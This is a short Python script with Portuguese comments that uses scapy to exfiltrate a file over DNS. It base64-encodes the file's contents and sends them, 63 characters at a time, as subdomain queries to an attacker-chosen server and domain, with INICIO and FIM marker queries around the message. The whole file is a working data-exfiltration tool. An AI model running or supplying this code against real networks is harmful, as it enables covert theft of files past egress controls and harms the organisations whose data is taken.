from scapy.all import *
import base64
import argparse

def dns_exfil(data, server, domain):
    # Pacote de INICIO
    pkt = IP(dst=server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"INICIO.{domain}"))
    send(pkt)

    # Pacotes da mensagem
    data = base64.b64encode(data).decode()
    for i in range(0, len(data), 63):
        subdomain = data[i:i+63]
        pkt = IP(dst=server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"{subdomain}.{domain}"))
        send(pkt)

    # Pacote de FIM
    pkt = IP(dst=server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"FIM.{domain}"))
    send(pkt)

parser = argparse.ArgumentParser(description="Envie uma mensagem por DNS")
parser.add_argument('file', type=str, help='Arquivo a ser enviado')
parser.add_argument('server', type=str, help='Servidor IP do DNS')
parser.add_argument('domain', type=str, help='Dominio a ser usado')

args = parser.parse_args()

# Abra o arquivo e leia o conteúdo
with open(args.file, "rb") as file:
    data = file.read()

dns_exfil(data, args.server, args.domain)
